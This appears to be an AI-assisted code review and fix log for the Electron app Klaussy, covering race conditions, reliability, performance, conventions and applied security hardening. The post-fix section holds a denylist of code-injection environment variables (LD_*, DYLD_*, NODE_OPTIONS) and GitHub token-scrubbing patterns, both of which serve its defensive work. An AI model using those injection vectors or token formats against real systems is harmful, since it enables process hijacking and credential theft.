### M-COR-13: PR picker entry interleaves with open PR list fetch
**[Location: `renderer/app.js:1266-1291` (recent) + `1293-1318` (prList)]**
- `prRecent().then(...)` and the subsequent `await window.klaus.prList()` overlap; recent-render can land after list-render, showing recent above "no PRs" state if list resolves first.
- **Fix:** render both sections with a single reconcile after both resolve (or use `Promise.all`).

### M-REL-1: No schema version on `config.json` — breaking shape changes silently corrupt state
**[Location: `main.js` config reads]**
- `savedSessions`, `prReviews`, `projects`, `uiState`, etc. accumulate with no version field. Next time you add a required field, older installs either crash or lose state.
- **Fix:** write `config.schemaVersion = 1`. On load, detect older versions and run `migrate(config, fromVersion)` to rewrite in new shape.

### M-REL-2: Log buffer is in-memory only — useless for post-crash bug reports
**[Location: `main.js:11-40`]**
- 500-entry ring, in RAM only. A crash or a long session (LSP/claude stderr floods) empties the ring. README tells users to "send Cmd+K → View Logs" for bug reports, but those logs are often gone when the user looks.
- **Fix:** tee to a rolling file in `app.getPath('userData')/logs/klaussy.log` (append-only, rotate at ~10MB, keep 3-5). Keep in-memory ring for the viewer.

### M-REL-3: Claude stderr dropped on zero-exit; `stderrBuf` unbounded
**[Location: every streaming handler — `main.js:2739-2757` is representative]**
- On `code === 0`, `stderrBuf` is discarded — warnings/rate-limit notices never surface. On non-zero, `stderrBuf` has been accumulating unboundedly per request.
- **Fix:** cap `stderrBuf` at ~64KB (keep last N bytes). On zero-exit with non-empty stderr, include it as `{ ok: true, stderr: stderrBuf }` so the UI can log it.

### M-REL-4: Silent `try { ... } catch {}` around `saveSessions` (and ~30 other sites)
**[Location: `main.js:341`, `main.js:405`, and many more]**
- Filesystem errors are invisible. A user with a full disk or bad permissions can lose session persistence entirely and never know.
- **Fix:** log save failures to `logBuffer`. Consider a UI status indicator after N consecutive save failures.

### M-REL-5: Error surfacing via 35 `alert()` calls
**[Location: grep `"alert\("` across `renderer/*.js`]**
- Blocking alerts freeze the main event loop; inconsistent with toasts used elsewhere; silently swallowed `catch {}` sites don't alert at all.
- **Fix:** add `window.Notify.error()` / `.info()` toast layer; replace `alert()` calls; keep native `dialog.showMessageBox` for destructive confirmations.

### M-PERF-1: Shared `config.json` hot-read on every PR action
**[Location: `main.js:2360-2363` — `currentRepoPath()`]**
- Every `pr-*` handler reads `config.json` synchronously via `loadConfig()`. Hot paths like `pr-review-checks` chain multiple reads.
- **Fix:** keep `activeRepoPath` in memory, update on `select-repo`/`switch-project`.

### M-PERF-2: Monaco + highlight.js eagerly loaded on every window
**[Location: `renderer/index.html:320` + `renderer/monaco-init.js` + `renderer/hljs-bundle.js`]**
- Monaco's 12MB `vs/loader.js` is loaded on every window startup; `require(['vs/editor/editor.main'])` is triggered eagerly. A separate 161KB hljs bundle is also loaded synchronously. Users who only run terminals never need either.
- **Fix:** flip `MonacoReady` to lazy — first `getMonaco()` call kicks off the require. Lazy-load hljs via dynamic `<script>` on first diff render. Consider dropping hljs entirely in favor of Monaco's `monaco.editor.colorize`.

### M-PERF-3: PTY broadcast to every window regardless of subscription
**[Location: `main.js:977-984`]**
- Every PTY chunk is serialized and IPC'd to every `allWindows` entry + every popout — even windows that don't render that terminal. 2 main windows + 1 popout = 3× IPC per chunk.
- **Fix:** track `Map<terminalId, Set<webContents>>` subscriptions; renderer calls `subscribe-terminal(id)` on mount.

### M-PERF-4: Diff panel re-renders the entire diff on every `refresh()`
**[Location: `renderer/diff-panel.js:1108-1173`]**
- `refresh()` fires on watcher events (200ms debounce) AND every 30s. Each run does `gitStatus` + `gitDiff` + `hljs.highlight(whole-file)` + string-concat HTML + full `innerHTML` replace. Nukes scroll and focus for large diffs.
- **Fix:** hash the diff text; skip re-render if unchanged. Preserve `scrollTop` across re-renders. Long-term: diff the DOM or use a virtualized list.

### M-PERF-5: Unthrottled terminal writes + 10k scrollback per terminal
**[Location: `renderer/terminal-manager.js:29` and the `onTerminalData` handler]**
- `terminal.write(data)` on every IPC chunk; with a verbose claude stream that's thousands of writes per second. 10k-line scrollback × N terminals adds up.
- **Fix:** buffer chunks in main for ~16ms (one frame) and send concatenated; drop scrollback to ~3k unless users specifically complain.

---

### M-ARCH-1: Renderer modules couple via 20+ `window.*` globals
**[Location: `renderer/index.html:326-347` (script order) + every module]**
- Direct cross-module calls: `DiffPanel.updateWorktree`, `PRPanel.setWorktree`, `Sidebar.showUnreadBadge`, `window._reloadDiffTab`, `window.closeFileViewerOnTaskSwitch`, `window.BranchlessUI.apply`, etc. `index.html` script order is load-bearing and uncommented.
- **Fix:** add a minimal `window.Events` (EventTarget) with events like `task:switched`, `worktree:changed`, `pr:loaded`. Each module subscribes. `terminal-manager.js`'s `switchToTask` shrinks from 40 lines to ~5.

### M-ARCH-2: Flat `window.klaus.*` IPC surface with ~180 methods
**[Location: `preload.js`]**
- One namespace, no grouping. Adding a second PR review flow (G7) meant `prReviewCacheGet` + `prReviewCacheGetByPr` side-by-side because the original couldn't evolve.
- **Fix:** group: `klaus.git.*`, `klaus.pr.*`, `klaus.lsp.*`, `klaus.task.*`, `klaus.config.*`, `klaus.ui.*`. Document each group's contract (idempotent? cancels? streams?).

### M-ARCH-3: `activePrReview` is a process-wide singleton
**[Location: `main.js:2323-2336`]**
- Only one PR review across all windows. Opening a PR in the main window silently replaces whatever was in the popout.
- **Fix:** either guard with a "close current review first?" prompt, or key state by PR URL and let each window own its own review.

---

## Conventions / Hygiene

### C-1 (High): README references a `dist:universal` script that doesn't exist
**[Location: `README.md:42` vs `package.json:8-14`]**
- README tells users to `npm run dist:universal` — that script is not in `package.json`. Running it errors with "Missing script." The actual scripts are `dist` (arm64 + x64 separately), `dist:arm64`, `dist:intel`.
- **Fix:** either add `"dist:universal": "electron-builder --mac --universal"` to `package.json`, or update README:
  ```
  npm run dist          # both arm64 + x64 (separate .dmgs)
  npm run dist:arm64    # arm64 only
  npm run dist:intel    # x64 only
  ```

### C-2 (High): `package.json` missing `license`, `engines`, `repository`, `private`
**[Location: `package.json`]**
- README says "Proprietary — internal tool, not for redistribution" but `package.json` has no `license` field. No `engines.node` despite README requiring Node 18+. No `repository` despite the app planning auto-update.
- **Fix:**
  ```json
  "private": true,
  "license": "UNLICENSED",
  "engines": { "node": ">=18" },
  "repository": { "type": "git", "url": "https://github.com/steph-dove/klausify-desktop.git" },
  ```

### C-3 (Medium): `postinstall` silently swallows every failure
**[Location: `package.json:14`]**
- All three commands end with `2>/dev/null || true`. If plutil moves, the Electron vendored bundle changes path, or the user's on Linux/Windows, the dev gets a branded-as-"Electron" app with no diagnostic. `app.setName('Klaussy')` at runtime (`main.js:203`) already handles the menu; this script is only for the dev-mode Info.plist.
- **Fix:** move to `scripts/postinstall.js` that early-exits on non-darwin with a log, and logs a warning (not a fatal error) on any step failure. Consider removing it entirely — the runtime `setName` already covers the user-visible surface.

### C-4 (Medium): Caret ranges on critical deps + README uses `npm install`
**[Location: `package.json:16-31`, `README.md:29`]**
- `^33.0.0` / `^0.45.0` / `^1.0.0` on `electron`, `monaco-editor`, `node-pty` mean two fresh `npm install`s can produce different binaries. `package-lock.json` pins in practice only with `npm ci`.
- **Fix:** change README install command to `npm ci`. OR pin the critical three with exact versions.

### C-5 (Medium): No `CONTRIBUTING.md` / `ARCHITECTURE.md` / `CLAUDE.md`
- 35kloc, 3-process model, 16+ IPC feature areas, and the only doc for new contributors is `README.md` (end-user focused). The renderer `window.Foo = (function() {...})()` pattern, script-load order, and state-ownership rules are all implicit.
- **Fix:** add a short `CONTRIBUTING.md` covering the three-process model, renderer module pattern, IPC naming, state-ownership rules, and `npm start` / `npm run dist` / debug flow.

### C-6 (Medium): `.claude/settings.local.json` not gitignored
**[Location: `.gitignore`]**
- `.claude/settings.local.json` exists at the repo root but isn't in `.gitignore`. These are user-specific Claude settings and shouldn't be committed.
- **Fix:** add `.claude/settings.local.json` (or `.claude/*.local.json`) to `.gitignore`.

### C-7 (Warn): Unrelated Swift/Xcode project `Klaussy/` lives inside this Electron repo
- The `Klaussy/` directory (a separate Swift app with its own `.git`) sits at the repo root. It IS gitignored (`.gitignore` lines 1-2), so it doesn't pollute `git status` — but a new contributor `ls`-ing the repo will see it and be confused. It's also an easy target for "why is there Swift in my Electron repo" head-scratching during code review.
- **Fix:** move it out of the Electron repo tree. If it truly belongs co-located, add a one-line `README.md` inside it explaining what it is and that it's unrelated to `klausify-desktop`.

### C-8 (Medium): `diff-panel.js` uses `let` while every other renderer module uses `var`
**[Location: `renderer/diff-panel.js:1-16`]**
- The established convention across 20+ renderer modules is `window.Foo = (function () { ... return { ... }; })();` with `var` inside. `diff-panel.js` is the only 1600-line outlier using `let` throughout.
- **Fix:** either normalize `diff-panel.js` to `var` for consistency, or document in `CONTRIBUTING.md` that `let`/`const` is allowed inside module bodies.

### C-9 (Medium): `renderMarkdown` duplicated with subtle divergence
- See M-COR-7.

### C-10 (Low): `prReviewComments` IPC is wired in preload + main but has no renderer caller
**[Location: `preload.js:182` + `main.js:4701`]**
- `grep -rn prReviewComments renderer/` returns nothing. `pr-panel.js` uses `prReviewThreads` exclusively.
- **Fix:** delete both handler + preload method, or add a comment explaining it's kept as a public API for future use.

### C-11 (Low): `popout.html` and `preferences.html` hardcode the Dark theme
**[Location: `renderer/popout.html:7-34`, `renderer/preferences.html:7-20`]**
- Inline `<style>` duplicates the Dark palette. Users on Light / Nord / Solarized get a dark popout and preferences window.
- **Fix:** load `styles.css` + `theme.js` into these HTMLs and call `ThemeManager.init()`, or send theme via the init IPC payload.

### C-12 (Low): Sub-terminals use `\x1b[13;2u` for Shift+Enter
**[Location: `renderer/terminal-manager.js:373-375`]**
- Main terminal uses `\\\r` (a known Claude-Ink limitation per memory); sub-terminals are plain zsh/bash and don't interpret CSI-u. Shift+Enter in a sub-terminal does nothing useful.
- **Fix:** in sub-terminals, emit `\n` for Shift+Enter since they're plain shells, not Ink apps.

### C-13 (Low): `about-log.js` exports `window.Dialogs`
- Every other module matches file-name to export-name. `about-log.js` contains `showAbout`, `showHowToUse`, `showFeedback`, `showLogs`.
- **Fix:** rename file to `dialogs.js`, or rename export to `window.AboutLog` and keep just the log-related dialogs there.

### C-14 (Low): `pr-panel.js` and `pr-review.js` — similar names, different scope
- `pr-panel.js` = PR for *your* branch (embedded in diff panel). `pr-review.js` = reviewing *someone else's* PR (separate root). Confusing from a file listing.
- **Fix:** rename `pr-panel.js` → `my-pr-panel.js` or group into `renderer/pr/{mine.js, review.js}`.

### C-15 (Low): `hljs-bundle.js` is an undocumented 161KB vendored bundle
- Version is buried in the minified blob; no header comment says how to regenerate.
- **Fix:** add `// highlight.js v11.11.1, bundled with <cmd> for use without a bundler.` at the top. Or drop it entirely (see M-PERF-2).

### C-16 (Low): `scripts/pyright-repro.js` is orphaned
- Not referenced from `package.json`; not mentioned in README.
- **Fix:** add `"repro:pyright": "node scripts/pyright-repro.js"` or link it from `CONTRIBUTING.md`.

---

## Nits (condensed)

- `main.js:655-656` — `const branch = \`${sanitized}\`;` is a pointless template literal.
- `main.js:2732`, `2796`, `2855`, `3118`, `3194`, `3919`, `4422` — `const { spawn } = require('child_process')` re-required in each handler; lift to the top.
- `renderer/inline-edit.js:130` — references `window.FileBrowserState` which is never set anywhere in the codebase, so `filePath` in AI edit prompts is always `null` (degrades prompt quality).
- `renderer/pr-review.js:11` — defensive `escHtml` fallback differs from canonical; just use `AppUtils.escHtml` and let it throw if utils failed to load.
- `main.js:366-372` and `main.js:3738-3740` — two separate `app.on('before-quit', ...)` handlers; merge for explicit ordering.
- `renderer/sidebar-manager.js:111-121` — `findTaskIdByWorktree` returns only first match; if two tasks share a worktree, the second's dirty indicator goes stale.
- `renderer/hljs-bundle.js` vendored vs `node_modules/highlight.js` both present and both loaded — pick one.
- `main.js:202-203` vs `package.json:2,3` — three names (`name: "klaus-desktop"`, `productName: "Klaussy"`, runtime `app.setName('Klaussy')`).
- `renderer/styles.css` at 8410 lines — split by feature (`styles/diff-panel.css`, etc.) with `@import`.

---

## Method note

Findings synthesized from 4 parallel focused sub-agents (correctness/concurrency, architecture/perf/reliability, security/quality/tests, scope/conventions). Highest-severity claims validated against the source before inclusion. Duplicate findings across agents were merged to the more specific report; severities are the maximum of contributing agents' assigned severities.

**Correction:** the original review claimed `Klaussy/` was already in `.gitignore` (lines 1-2). That was wrong — I misread the validation output. `Klaussy/` was NOT gitignored until Batch 1 added it.

---

## Post-fix status

Batches 1 and 2 from the fix plan have been applied in this working tree. The commits below address the findings listed in this review.

### Applied — all Highs + Mediums that are surgical

Security (all Highs):
- **H-SEC-1** — `read-file`/`write-file`/`read-skill-file`/`write-skill-file`/`create-memory-file`/`read-conflict-file`/`write-resolved-file`/`read-files-bulk`/`replace-in-files` now validated via a shared `pathUnder` helper that refuses `..` traversal AND symlink escapes. `read-file`/`write-file` allowed roots = active worktrees + registered projects + `userData`; skill/memory IPCs restricted to `~/.claude`; conflict IPCs restricted to their worktree.
- **H-SEC-2** — CSP meta tag added to `index.html`, `pr-review.html`, `popout.html`, `preferences.html`. Permissive for `'unsafe-eval'`/`'unsafe-inline'` (Monaco + inline scripts need them) but blocks remote script loading, object/iframe embedding, and restricts `connect-src` to `'self'`.
- **H-SEC-3** — `AppUtils.escHtml` now escapes `"` and `'` (plus `& < >`); `escAttr` exported. PR picker in `app.js` migrated to `AppUtils.escHtml`/`escAttr` in both the "Recently reviewed" and "Open in current project" blocks. Three duplicate local `escAttr` implementations in diff-panel/pr-panel/env-panel left in place (they already escape correctly).
- **H-SEC-4** — `execSync` template-string `git worktree add` at `main.js:700`/`1675` replaced with `execFileSync` argv. No remaining `execSync(\`...\`)` calls.
- **H-SEC-5** — `open-external` IPC now validates protocol against `{http:, https:, mailto:}` allowlist. `open-skill-file` restricted to under `~/.claude` via `pathUnder`.
- **H-SEC-6** — `hardenWindow(win)` helper installed on all 4 `BrowserWindow` sites. Denies `window.open`, blocks `will-navigate` away from `file://`, and calls `lspManager.stopServersForWebContents(wc)` on destroy.
- **H-SEC-7** — Bracketed-paste write strips `\x1b[20[01]~` from the untrusted `text` before wrapping.
- **H-SEC-8** — PTY `extraEnv` sanitized via `sanitizeExtraEnv`: rejects non-identifier names and a denylist (`LD_*`, `DYLD_*`, `NODE_OPTIONS`, `PATH`, `PYTHONPATH`, `RUBYOPT`, `PERL5LIB`, `RUBYLIB`, `PYTHONSTARTUP`).
- **H-SEC-9** — After the initial `git clone` with token-bearing URL, `git remote set-url origin` is run to scrub the token from `.git/config`. Fetch still passes the authed URL (short-lived, argv-only).

Correctness (all Highs):
- **H-COR-1** — `kill-task` now sets `inst.killed = true` before `pty.kill()`; `onExit` checks this flag to skip `convertInstanceToShell`.
- **H-COR-2** — `saveConfig` rewritten to write atomically (`.tmp` + `renameSync`) and serialize writes behind `_saveConfigQueue` (single in-flight promise). `before-quit` now `preventDefault`s and waits for the queue to drain before calling `app.quit()`.
- **H-COR-3** — `hardenWindow` wires `webContents.on('destroyed')` → `lspManager.stopServersForWebContents`, plugging the LSP-subprocess leak.
- **H-COR-4** — `restart-task` sets `inst.restarting = true` before `pty.kill()`; clears after new PTY spawns.
- **H-COR-5** — Saved-session dismiss uses new `dismissSavedSession(session)` IPC that filters by `worktreePath + sessionId` instead of closure-captured index. Individual dismisses now persist.
- **H-COR-6** — `git-discard` branches on `git status --porcelain`: `??` → `clean -f`; `A*` (staged-new) → `reset` (no more data loss); tracked changes → `reset` + `checkout`. Returns per-file results.

Architecture / perf — only the surgical ones (see "Remaining" for the big ones):
- **H-ARCH-3** — Deferred to Batch 3 (needs a migration pass; touched via other fixes).
- **M-COR-5** to **M-COR-13** — Applied where surgical.

Other Mediums applied:
- **M-SEC-1** — Path traversal guards consolidated via `pathUnder` (symlinks refused; `read-files-bulk` uses `lstat` + `pathUnder`; `replace-in-files` uses `pathUnder` per file).
- **M-SEC-2** — `git grep` now includes `--` separator before the query.
- **M-SEC-3** — `ghTokenCache` given a 5-minute TTL; `gh-switch-account` clears it explicitly. Owner-parse regex broadened to accept any host (GHE).
- **M-SEC-4** — `captureLog` scrubs `oauth2:…@`, `ghp_*`/`gho_*`/`ghs_*`/`ghu_*`/`ghr_*`, and `Bearer …` tokens from log messages before storing.
- **M-SEC-5** — `write-transcript` no longer accepts an arbitrary path. `export-transcript` records the dialog-chosen path main-side in `pendingTranscripts`; `write-transcript(id, content)` looks it up.
- **M-COR-1** — `fetchThreadsForActive` guarded by `_threadsFetchEpoch`; stale responses dropped via `stale()` check instead of per-field `number` comparison.
- **M-COR-2** — `listSessionFiles` uses `bigint: true` for nanosecond-precision `ctimeNs`; `detectClaudeSessionId` sorts on `ctimeNs` to disambiguate sub-second spawns.
- **M-COR-4** — `saveUIState` periodic timer + `onBeforeQuit` hook gated on `!isSecondaryWindow` so secondary windows don't clobber the main window's state.
- **M-COR-7** — `pr-panel.js` `renderMarkdown` fixed to extract fenced code blocks BEFORE escaping (was the buggy one; `pr-review.js` version was correct).
- **M-COR-12** — `pr-review-checks` now requires `runsRes.err && statusRes.err` before returning error.
- **M-REL-2** — Log ring tees to a rolling file in `userData/logs/klaussy.log` (2MB rotation, 3 files kept).
- **M-REL-3** — Claude stream handlers now cap `stderrBuf` at 64KB via `appendStderr`; zero-exit now sends `{ ok: true, stderr }` so non-fatal warnings reach the renderer.
- **M-REL-4** — `saveSessions` catch sites now log to `captureLog` instead of silently swallowing.
- **M-PERF-6/7** style — file-tree filter input debounced 120ms to avoid rebuilding 10k DOM nodes per keystroke.

Conventions / hygiene:
- **C-1** — `README.md` `dist:universal` removed (script didn't exist); doc now matches actual scripts.
- **C-2** — `package.json` has `license: "UNLICENSED"`, `private: true`, `engines.node: ">=18"`, `repository`, and a more accurate `description`.
- **C-6** — `.gitignore` adds `.claude/settings.local.json`.
- **C-7 (corrected)** — `.gitignore` adds `Klaussy/` (the original review wrongly claimed it was already there).
- **C-10** — `prReviewComments` IPC + preload method deleted (was unused).
- **C-12** — Sub-terminal `Shift+Enter` emits `\n` (plain shells) rather than the CSI-u sequence that only Ink apps understand.

Lows / nits:
- `const { spawn } = require('child_process')` hoisted out of 12 handler bodies into the top-level `require`.
- `const branch = \`${sanitized}\`` simplified to `const branch = sanitized` at `main.js:875`.
- `window.FileBrowserState` reference in `inline-edit.js` replaced with `s.model.uri.fsPath` (the state object was never populated).
- Two `app.on('before-quit', ...)` handlers merged into one.

### Remaining — Batch 3 (architectural, explicitly deferred)

These need discussion on scope and risk before landing:
- **H-ARCH-1** — split `main.js` (5063 lines) into per-feature modules.
- **H-ARCH-2** — extract `spawnClaudeStream` helper to collapse 8 duplicate claude-streaming handlers.
- **H-ARCH-3** — unify the two parallel PR review caches + write a migration.
- **H-PERF-1** — convert ~30 `execFileSync` git handlers to async `execFileP` (risky without tests).
- **M-ARCH-1** — introduce `window.Events` (EventTarget) to decouple renderer modules from `window.*` globals.
- **M-ARCH-2** — namespace `window.klaus.*` into `klaus.git`, `klaus.pr`, etc.
- **M-PERF-2/3** — lazy-load Monaco / drop hljs in favor of Monaco's `colorize`; virtualize the file-tree list; throttle PTY broadcast.
- **M-REL-5** — `alert()` → toast layer (needs a new UI primitive).
- **H-SEC-10** — build out an automated test suite (new initiative, not a single fix).
- **M-REL-1** — add `config.schemaVersion` + migration.

### Verification

All edited files pass `node --check`. No runtime validation was done — the app wasn't launched, and there's no test suite. Users should smoke-test the app (open a project, create a task, open a PR review, pop out a terminal) before shipping to confirm the changes don't regress the happy path. The highest risk areas to exercise are: file viewer open/save (H-SEC-1 path restrictions), PR picker (escaping + URL loading), PR review flows (H-SEC-9 token scrub + M-COR-1 epoch guard), and kill/restart task (H-COR-1/4 markers).
